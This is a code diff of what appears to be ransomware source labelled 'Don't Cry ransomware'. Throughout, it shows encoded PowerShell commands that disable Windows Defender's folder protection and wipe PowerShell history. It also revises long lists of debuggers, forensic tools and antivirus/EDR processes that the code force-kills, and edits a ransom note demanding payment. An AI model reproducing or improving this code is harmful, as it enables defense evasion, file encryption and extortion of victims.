@@ -324,33 +324,23 @@ def block_processes():
     execute_command("powershell -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQBuAGEAYgBsAGUAQwBvAG4AdAByAG8AbABsAGUAZABGAG8AbABkAGUAcgBBAGMAYwBlAHMAcwAgAEQAaQBzAGEAYgBsAGUAZAA=")
     execute_command("powershell -ExecutionPolicy Bypass -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUABTAFIAZQBhAGQATABpAG4AZQBcAEMAbwBuAHMAbwBsAGUASABvAHMAdABfAGgAaQBzAHQAbwByAHkALgB0AHgAdAAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA==")
     blocked_processes = [
-        "cmd", "powershell", "regedit", "taskmgr", "explorer",
-        "netstat", "msconfig", "perfmon", "tasklist", "services",
-        "sysmon", "eventvwr", "wmic", "schtasks", "SecurityHealthSystray",
-        "MpCmdRun", "MsMpEng", "smartscreen", "ProcessHacker",
-        "procexp", "procexp64", "tcpview", "wireshark", "autoruns",
-        "autorunsc", "filemon", "regmon", "sandboxie", "ollydbg",
-        "x32dbg", "x64dbg", "ida64", "ida", "windbg", "Dbgview",
-        "frida", "hookexplorer", "gmer", "cain", "fiddler", "procmon",
-        "regripper", "netmon", "WMIADAP", "SbieCtrl", "SbieSvc",
-        "mbam", "mbamtray", "mbae", "mbaeservice", "cyserver",
-        "cytray", "cb", "carbonblack", "SentinelAgent", "SentinelUI",
-        "SentinelHelperService", "esensor", "csfalconcontainer",
-        "csfalconservice", "csfalcon", "sxutil", "taskmgr.exe",
-        "process.exe", "processhacker.exe", "ksdumper.exe",
-        "fiddler.exe", "httpdebuggerui.exe", "wireshark.exe",
-        "httpanalyzerv7.exe", "decoder.exe", "regedit.exe",
-        "procexp.exe", "dnspy.exe", "vboxservice.exe",
-        "burpsuit.exe", "DbgX.Shell.exe", "ILSpy.exe",
-        "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "gdb.exe",
-        "idaq.exe", "idag.exe", "idaw.exe", "ida64.exe",
-        "idag64.exe", "idaw64.exe", "idaq64.exe", "windbg.exe",
-        "immunitydebugger.exe", "windasm.exe"
+        "DbgX.Shell", "Dbgview", "ILSpy", "MpCmdRun", "MsMpEng", "ProcessHacker", "SbieCtrl",
+        "SbieSvc", "SecurityHealthSystray", "SentinelAgent", "SentinelHelperService", "SentinelUI", "WMIADAP", "autoruns",
+        "autorunsc", "burpsuit", "cain", "carbonblack", "cb", "cmd", "csfalcon",
+        "csfalconcontainer", "csfalconservice", "cyserver", "cytray", "decoder", "dnspy", "esensor",
+        "eventvwr", "explorer", "fiddler", "filemon", "frida", "gdb", "gmer",
+        "hookexplorer", "httpanalyzerv7", "httpdebuggerui", "ida", "ida64", "idag", "idag64",
+        "idaq", "idaq64", "idaw", "idaw64", "immunitydebugger", "ksdumper", "mbam",
+        "mbamtray", "mbae", "mbaeservice", "msconfig", "netmon", "netstat", "ollydbg",
+        "perfmon", "powershell", "process", "processhacker", "procexp", "procexp64", "procmon",
+        "regedit", "regmon", "regripper", "sandboxie", "schtasks", "services", "smartscreen",
+        "sxutil", "sysmon", "tasklist", "taskmgr", "tcpview", "vboxservice", "wireshark",
+        "windasm", "windbg", "wmic", "x32dbg", "x64dbg",
     ]
 
     
     for proc in blocked_processes:
-        execute_command(f"taskkill /f /im \"{proc}.exe\"")
+        execute_command(f"taskkill /f /im \"{proc}\"")
 
 
 def encrypt_key(aes_key):
@@ -487,7 +477,7 @@ All of your important files have been encrypted by the Don't Cry ransomware.
 To get them back, please follow the instructions below.
 
 1. Do not try to recover your files by yourself!
-- If you try to decrypt the encryption yourself, your files will be permanently lost.
+- If you try to decrypt the files yourself, your files will be permanently lost.
 
 2. How to restore your files?
 - You need to pay a ransom to get the decryption key.
@@ -547,7 +537,7 @@ def disable_AV():
         "ccapp", "ccevtmgr", "ccimscan", "ccproxy", "ccpwdsvc", "ccpxysvc", "ccsetmgr", "cfgwiz", "cfp", "clamd", "clamservice", "clamtray", "cmdagent", "cpd", "cpf", "csinsmnt", "dcsuserprot", "defensewall", "defensewall_serv", "defwatch", "f-agnt95", "fpavupdm", "f-prot95",
         "f-prot", "fprot", "fsaua", "fsav32", "f-sched", "fsdfwd", "fsm32", "fsma32", "fssm32", "f-stopw", "f-stopw", "fwservice", "fwsrv", "iamstats", "iao", "icload95", "icmon", "idsinst", "idslu", "inetupd", "irsetup", "isafe", "isignup",
         "issvc", "kav", "kavss", "kavsvc", "klswd", "kpf4gui", "kpf4ss", "livesrv", "lpfw", "mcagent", "mcdetect", "mcmnhdlr", "mcrdsvc", "mcshield", "mctskshd", "mcvsshld", "mghtml", "mpftray", "msascui", "mscifapp", "msfwsvc", "msgsys", "msssrv",
-        "navapsvc", "navapw32", "navlogon.dll", "navstub", "navw32", "nisemsvr", "nisum", "nmain", "noads", "nod32krn", "nod32kui", "nod32ra", "npfmntor", "protect", "nsmdtr", "oasclnt", "ofcdog", "opscan", "ossec-agent", "outpost", "paamsrv", "pavfnsvr", "pcclient",
+        "navapsvc", "navapw32", "navlogon.dll", "navstub", "navw32", "nisemsvr", "nisum", "nmain", "noads", "nod32krn", "nod32kui", "nod32ra", "npfmntor", "nprotect", "nsmdtr", "oasclnt", "ofcdog", "opscan", "ossec-agent", "outpost", "paamsrv", "pavfnsvr", "pcclient",
         "pccpfw", "pccwin98", "persfw", "protector", "qconsole", "qdcsfs", "rtvscan", "sadblock", "safe", "sandboxieserver", "savscan", "sbiectrl", "sbiesvc", "sbserv", "scfservice", "sched", "schedm", "scheduler daemon", "sdhelp", "serv95", "sgbhp", "sgmain", "slee503",
         "smartfix", "smc", "snoopfreesvc", "snoopfreeui", "spbbcsvc", "sp_rsser", "spyblocker", "spybotsd", "spysweeper", "spysweeperui", "spywareguard.dll", "spywareterminatorshield", "ssu", "steganos5", "stinger", "swdoctor", "swupdate", "symlcsvc", "symundo", "symwsc", "symwscno", "tcguard", "tds2-98",
         "tds-3", "teatimer", "tgbbob", "tgbstarter", "tsatudt", "umxagent", "umxcfg", "umxfwhlp", "umxlu", "umxpol", "umxtray", "usrprmpt", "vetmsg9x", "vetmsg", "vptray", "vsaccess", "vsserv", "wcantispy", "win-bugsfix", "winpatrol", "wrsssdk", "xcommsvr", "xfr",
@@ -555,7 +545,7 @@ def disable_AV():
     ]
     
     for proc in AV_processes:
-        execute_command(f"taskkill /f /im \"{proc}.exe\"")
+        execute_command(f"taskkill /f /im \"{(proc + ".exe") if not proc.endswith(".dll") else proc}\"")
 
 
 def disable_all():
